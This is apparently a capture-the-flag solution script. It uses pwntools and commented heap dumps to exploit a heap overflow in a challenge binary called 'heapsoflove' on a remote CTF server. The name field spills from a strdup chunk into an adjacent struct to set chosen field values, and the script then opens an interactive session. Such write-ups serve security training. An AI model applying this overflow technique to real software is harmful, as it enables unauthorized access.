# 0x804c000:	0x00000000	0x00000011	0x41414141	0x00000000 <- strdup allocation
# 0x804c010:	0x00000000	0x00000011	0x0804c008	0x00000000 <- user_account struct
# 0x804c020:	0x00000000

# user->name is pointing to strfup allocated chunk
# strdup allocated chunk remains the same
# so if we change name we can overflow from strdup cunk to user_account chunk
# we need 10 fingers and gender 1337

# 0x804c000:	0x00000000	0x00000011	0x41414141	0x41414141 <- strdup allocation
# 0x804c010:	0x41414141	0x41414141	0x41414141	0x0000000a <- user_account fingers
# 0x804c020:	0x00000539 <- gender

# payload above not injected:
# 0x804c000:	0x00000000	0x00000011	0x41414141	0x41414141
# 0x804c010:	0x41414141	0x41414141	0x41414141	0x00000000 <-
# 0x804c020:	0x00000539

from pwn import *

payload = 'A' * 16
payload += p32(0x00000539)
payload += p32(0x0000000a)
payload += p32(0x00000539)

# p = process('./heapsoflove')
p = remote('ctf.hackucf.org', 7001)

p.sendlineafter('Name: ', 'AAAA')
p.sendlineafter('Fingers: ', '1')
p.sendlineafter('Gender: ', '1')

p.sendlineafter('Choice: ', '2')
p.sendlineafter('breathtaking one?', payload)
p.sendlineafter('Choice: ', '3')

# gdb.attach(p)
# pause()
p.interactive()
p.close()